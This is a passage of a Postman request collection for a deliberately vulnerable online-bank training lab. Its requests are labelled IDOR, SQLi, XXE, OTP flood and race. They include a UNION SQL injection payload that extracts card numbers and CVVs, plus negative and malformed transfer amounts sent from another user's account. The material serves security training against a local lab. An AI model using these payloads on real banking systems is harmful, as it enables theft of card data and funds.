{
  "info": {
    "name": "NDBVB — OnlineBank (vulnerable lab)",
    "_postman_id": "b1a7c0de-0000-4000-8000-0nlinebank1",
    "description": "Requests for NDBVB (not damn but vulnerable bank): the OnlineBank training stand. Set {{base_url}} (default http://localhost:9080) and {{token}} after login. Flags and walkthroughs: docs/SOLUTIONS.md.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:9080"
    },
    {
      "key": "token",
      "value": ""
    },
    {
      "key": "challenge_id",
      "value": ""
    }
  ],
  "item": [
    {
      "name": "Auth",
      "item": [
        {
          "name": "Login (step 1: password)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "url": "{{base_url}}/api/v1/auth/login",
            "body": {
              "mode": "raw",
              "raw": "{\"login\":\"ama@onlinebank.app\",\"password\":\"OnlineBank!123\"}"
            }
          }
        },
        {
          "name": "Verify OTP (step 2)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "url": "{{base_url}}/api/v1/auth/verify-otp",
            "body": {
              "mode": "raw",
              "raw": "{\"challenge_id\":\"{{challenge_id}}\",\"code\":\"0000\"}"
            },
            "description": "Add \"phone\":\"+233501234567\" to verify with a code delivered to another phone (AUTH-2)."
          }
        },
        {
          "name": "Request OTP again (flood)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "url": "{{base_url}}/api/v1/auth/request-otp",
            "body": {
              "mode": "raw",
              "raw": "{\"login\":\"ama@onlinebank.app\",\"password\":\"OnlineBank!123\"}"
            }
          }
        },
        {
          "name": "JWKS (public key)",
          "request": {
            "method": "GET",
            "url": "{{base_url}}/api/v1/auth/jwks.json"
          }
        },
        {
          "name": "Change password (no revocation)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/auth/change-password",
            "body": {
              "mode": "raw",
              "raw": "{\"old_password\":\"OnlineBank!123\",\"new_password\":\"OnlineBank!456\"}"
            }
          }
        }
      ]
    },
    {
      "name": "Accounts & statements",
      "item": [
        {
          "name": "My accounts",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/accounts"
          }
        },
        {
          "name": "Account details (IDOR)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/accounts/1004"
          }
        },
        {
          "name": "Balance (IDOR)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/accounts/1004/balance"
          }
        },
        {
          "name": "Transactions + search (SQLi)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/accounts/1001/transactions?search=&sort=ts%20DESC"
          },
          "description": "UNION payload: search=') UNION SELECT id, NULL::timestamptz, pan, NULL::float8, cvv, holder, note, 'leak' FROM cards--"
        },
        {
          "name": "Import XML statement (XXE)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/statements/import",
            "body": {
              "mode": "formdata",
              "formdata": [
                {
                  "key": "file",
                  "type": "file",
                  "src": "statement.xml"
                }
              ]
            }
          }
        }
      ]
    },
    {
      "name": "Transfers & exchange",
      "item": [
        {
          "name": "Transfer (foreign from_account / notations)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/transfers",
            "body": {
              "mode": "raw",
              "raw": "{\"from_account\":1004,\"to_account\":1001,\"amount\":\"100.00\",\"description\":\"rent\"}"
            }
          },
          "description": "Try amount 0x64, 1e2, +50, -50, 1e-9. Change from_account freely (AC-2)."
        },
        {
          "name": "Beneficiaries (dead end)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/transfers/beneficiaries"
          }
        },
        {
          "name": "Exchange rate",
          "request": {
            "method": "GET",
            "url": "{{base_url}}/api/v1/exchange/rate?from_cur=USD&to_cur=GHS"
          }
        },
        {
          "name": "Convert (race target)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              },
              {
                "key": "Authorization",
                "value": "Bearer {{token}}"
              }
            ],
            "url": "{{base_url}}/api/v1/exchange/convert",
            "body": {
              "mode": "raw",
              "raw": "{\"account_id\":1001,\"to_currency\":\"GHS\",\"amount\":\"600\"}"
            },
            "description": "Send a group in parallel (single packet) to trigger BIZ-1."
          }
        }
      ]
    },
